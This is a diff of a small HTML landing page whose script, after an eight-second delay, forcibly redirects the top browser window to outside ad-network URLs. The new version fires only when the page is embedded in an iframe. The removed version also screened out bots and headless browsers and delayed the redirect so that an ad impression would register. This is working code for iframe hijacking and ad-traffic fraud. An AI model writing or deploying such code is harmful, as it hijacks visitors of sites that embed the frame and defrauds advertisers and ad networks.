@@ -1,46 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Safe Redirect</title>
+  <meta charset="utf-8">
+  <title>Landing</title>
 </head>
 <body>
+
+<h1>landing-redirect</h1>
 
 <script>
 (function () {
 
-    // 1. Pastikan JavaScript & browser normal
-    if (!navigator.userAgent || !screen.width || !screen.height) return;
+  // Jangan redirect kalau dibuka langsung
+  if (window.self === window.top) return;
 
-    // 2. Filter bot dasar (AMAN)
-    const ua = navigator.userAgent.toLowerCase();
-    if (
-        ua.includes("headless") ||
-        ua.includes("phantom") ||
-        ua.includes("bot") ||
-        ua.includes("crawler")
-    ) return;
-
-    // 3. Pastikan iframe terlihat (bukan hidden 0x0)
-    if (window.innerWidth < 300 || window.innerHeight < 250) return;
-
-    // 4. Cegah redirect berulang
-    if (sessionStorage.getItem("rd_done")) return;
-    sessionStorage.setItem("rd_done", "1");
-
-    // 5. Delay agar impression tercatat
-    setTimeout(function () {
-        try {
-            window.top.location.replace("https://likedgreetedrape.com/v3hbtejj?key=3594a81cbcbeca99db8fd689967d1a1b");
-        } catch (e) {
-            window.location.href = "https://likedgreetedrape.com/v3hbtejj?key=3594a81cbcbeca99db8fd689967d1a1b";
-        }
-    }, 8000);
+  // Delay aman untuk iframe traffic
+  setTimeout(function () {
+    try {
+      window.top.location.replace("https://otieu.com/4/9620599");
+    } catch (e) {
+      window.location.href = "https://otieu.com/4/9620599";
+    }
+  }, 8000);
 
 })();
 </script>
-
-<p>Loading…</p>
 
 </body>
 </html>
